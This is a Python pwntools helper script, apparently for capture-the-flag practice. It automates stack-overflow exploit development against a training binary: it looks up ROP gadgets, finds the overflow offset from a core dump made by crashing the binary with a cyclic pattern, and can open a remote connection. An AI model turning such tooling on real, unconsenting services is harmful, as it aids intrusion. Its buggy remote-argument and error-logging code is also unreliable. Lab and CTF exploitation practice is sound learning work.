#!/bin/env python3

import argparse
import os
from pprint import pprint
from sys import argv as _ARGV
from pwn import *

_DEFAULT_BIN	= "./bin/split"
_PADDING_INFO	= 30
_LENGTH_CYCLIC	= 0xff
__version__		= "0.0.0-alpha"

class Logger():
	@staticmethod
	def get_mode(mode):
		match mode:
			case 0: return(log.success)
			case 1: return(log.failure)
			case 2: return(log.info)
			case 3: return(log.warn)

	def log_payload(self, title, payload):
		payload_decoded = ''.join(
			[ "\\x" + f"{b:X}".rjust(2, '0') for b in payload ]
		)
		self.log_padded(title, payload_decoded, 1)

	def log_padded(self, title, value, mode=2):
		log_func = self.get_mode(mode)
		log_func(f"{title}\x1b[{_PADDING_INFO}G➞ [{value}]")

	def log_list(self, title, mode=2, *items):
		log_func = self.get_mode(mode)
		log_func(title + ": ")
		for item in items:
			log.info(f"    ➞ {item}")

class AkAuto():

	def __init__(self):
		self.args		= self.parse_args()
		self.logger		= Logger()
		self.ropz		= dict()
		self.offset		= 0
		self.core_dump	= None

		term.init()
		self.load_binary()
		context.log_file = "ak.log"
		context.binary = self.elf_loaded

		# default usefull rop
		self.load_ropz("ret", "ret")
		self.load_ropz("pop_rdi", "pop rdi", "ret")

	def load_binary(self):
		self.elf_loaded = ELF(self.args.target)
		self.rop_loaded = ROP(self.elf_loaded)
		self.arch = self.elf_loaded.arch
		# Some thing may change between amd64 and i386
		if self.arch == "amd64":
			self.pack_function = p64
			self.base_ptr = "rbp"
			self.inst_ptr = "rip"
		elif self.arch == "i386":
			self.pack_function = p32
			self.base_ptr = "ebp"
			self.inst_ptr = "eip"
		# if remote launch remote
		if args.remote:
			self.main_proc = remote(args.host, args.port)
		# otherwise launch
		else:
			self.main_proc = self.elf_loaded.process()
			# attach gdb to process
			if self.args.gdb:
				gdb.attach(self.main_proc, """
					c
					""", api=True)

	@staticmethod
	def parse_args():
		parser = argparse.ArgumentParser(
			description="Auto ak some binary"
		)
		parser.add_argument(
			"-t", "--target",
			help="choose the binary to target",
			default=_DEFAULT_BIN,
			type=str,
			required=False
		)
		parser.add_argument(
			"--libc",
			help="specify a libc binary",
			default=None,
			type=str,
			required=False
		)
		parser.add_argument(
			"-r", "--remote",
			help="run remotly",
			default=False,
			action="store_true"
		)
		parser.add_argument(
			"-v", "--version",
			action="version",
			version=f"%(prog)s {__version__}")
		parser.add_argument(
			"-g", "--gdb",
			help="should attach gdb with pwn tool",
			action="store_true",
			required=False
		)
		if "-r" in _ARGV or "--remote" in _ARGV:
			h_and_p_required=True
		else:
			h_and_p_required=False
		parser.add_argument(
			"-H", "--host",
			help="host for the remote connection",
			required=h_and_p_required,
			type=str,
		)
		parser.add_argument(
			"-p", "--port",
			help="port for the remote connection",
			required=h_and_p_required,
			type=int,
		)
		return (parser.parse_args())

	@staticmethod
	def addr_to_str(addr):
		return (binascii.unhexlify(str(hex(addr))[2:]))

	def pack_all(self, *items):
		self.logger.log_list("To pack", 2, *[ hex(i[1]) for i in enumerate(items) ])
		packed = b''.join([ self.pack_function(r) for r in items ])
		self.logger.log_payload("pack all", packed)
		return (packed)

	def load_ropz(self, name, *ropz):
		try:
			self.ropz[name] = self.rop_loaded.find_gadget(ropz)[0]
		except TypeError:
			self.logger.log_padded(f"ropz not found", ','.join(ropz), 0)
		else:
			self.logger.log_padded(f"ropz found {{{hex(self.ropz[name])}}}", ','.join(ropz), 0)

	def get_core_dump(self, length):
		_tmp_proc = self.elf_loaded.process()
		_tmp_proc.sendline(cyclic(length))
		_tmp_proc.wait_for_close()
		context.log_console = open('/dev/null', 'w')
		self.core_dump = _tmp_proc.corefile
		context.clear()
		# remove core dump
		self.logger.log_padded("Removing core dump", self.core_dump.path)
		os.remove(self.core_dump.path)

	def find_offset(self, reg=None, length=_LENGTH_CYCLIC):
		if reg == None:
			reg = self.base_ptr
		log.info("Searching for the offset")
		# get the coredump
		if self.core_dump == None:
			self.get_core_dump(length)
		# suppress error of cyclic
		context.log_console = open('/dev/null', 'w')
		# searching for cyclic in the "reg"
		self.offset = cyclic_find(self.core_dump.registers[reg])
		context.clear()
		self.offset += len(self.addr_to_str(self.core_dump.registers[reg]))
		# report
		if self.offset == -1:
			log.failed("offset not found.")
		else:
			self.logger.log_padded("offset found", str(self.offset), 0)

if __name__ == "__main__":
	ak = AkAuto()
	ak.find_offset()
	ak.main_proc.interactive()
